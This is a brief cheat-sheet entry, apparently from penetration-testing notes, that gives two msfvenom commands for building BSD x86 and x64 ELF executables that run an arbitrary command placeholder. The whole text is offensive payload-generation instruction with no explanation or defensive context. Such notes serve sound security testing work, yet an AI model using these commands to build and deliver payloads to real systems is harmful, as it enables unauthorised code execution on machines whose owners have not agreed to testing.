# Executable Binary Payloads

## Execute BSD Exec Payload

```
$ msfvenom -p bsd/x86/exec cmd="<commands>" -f elf -o exec-cmd-x86

$ msfvenom -p bsd/x64/exec cmd="<commands>" -f elf -o exec-cmd-x64
```